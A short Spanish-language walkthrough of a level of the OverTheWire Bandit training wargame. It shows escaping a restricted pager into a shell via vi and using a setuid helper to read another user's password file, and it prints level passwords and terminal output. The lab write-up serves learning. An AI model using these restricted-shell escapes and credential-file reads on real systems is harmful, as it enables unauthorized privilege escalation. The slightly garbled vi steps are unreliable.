## Objetivo
Good job getting a shell! Now hurry and grab the password for bandit27!
## Datos de acceso al nivel
**Usuario:** bandit26
**Contraseña:** c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
**Servidor:** bandit.labs.overthewire.org
```
ssh bandit@bandit.labs.overthewire.org -p 2220
```
## Solución

```
Entrar modo diablo.
1. Hacer chica la terminal.
2. Ingresar un !
3. ingresar una v
4. Ingresar :set bash?
5. :set bash=/bin/bash
6. sh

bandit26@bandit:~$ ls
bandit27-do  text.txt
bandit26@bandit:~$ file bandit27-do
bandit27-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=037b97b430734c79085a8720c90070e346ca378e, for GNU/Linux 3.2.0, not stripped
bandit26@bandit:~$ ./bandit27-do
Run a command as another user.
  Example: ./bandit27-do id
bandit26@bandit:~$ ./bandit27-do whoami
bandit27
bandit26@bandit:~$ cat /etc/bandit_pass/bandit27
cat: /etc/bandit_pass/bandit27: Permission denied
bandit26@bandit:~$ ./bandit27-do cat  /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS

```
## Notas adicionales
## Referencias